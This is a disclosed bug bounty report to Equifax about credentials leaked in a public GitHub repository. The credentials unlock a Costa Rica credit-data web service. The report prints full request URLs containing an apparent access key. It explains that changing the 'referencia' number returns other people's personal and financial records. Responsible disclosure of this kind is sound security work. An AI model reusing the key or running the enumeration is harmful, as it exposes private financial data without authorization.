# Information Leak (Github)

## Report Details
- **Report ID**: 694931
- **URL**: https://hackerone.com/reports/694931
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2019-09-14T18:01:00.202Z
- **Disclosed**: 2020-04-09T20:47:52.176Z

## Reporter
- **Username**: zifrox
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: equifax

## Vulnerability Information
In Github I found some credentials to use in a webservice that exposes very sensitive information of people, family group, financial situation, and more.

Github:
https://github.com/geraldincg/proyecto/blob/9c89787deb1d217f58b58786d90bfb3eab290237/Proyecto/ViewModels/WebService/ConexionWS.cs

The  webservice is subdomain for Costa Rica:
Change "referencia" identification number to obtain different results.
Example:

https://webservices.equifax.cr/webservices/efx_consultas.asmx/Estudio_360_Fisico?referencia=891550&Cedula=&Usuario=&Clave=EKJH1QF2IXL3FSI4APWSD5XWFGX63KLK76JFXU80RTCQWS&Usuario_Datum=

https://webservices.equifax.cr/webservices/efx_consultas.asmx/Estudio_360_Fisico?referencia=891547&Cedula=&Usuario=&Clave=EKJH1QF2IXL3FSI4APWSD5XWFGX63KLK76JFXU80RTCQWS&Usuario_Datum=

https://webservices.equifax.cr/webservices/efx_consultas.asmx/Estudio_360_Fisico?referencia=891543&Cedula=&Usuario=&Clave=EKJH1QF2IXL3FSI4APWSD5XWFGX63KLK76JFXU80RTCQWS&Usuario_Datum=

## Impact

An attacker can extract information any people in the system.

## Attachments
- cr02.png
- cr01.png
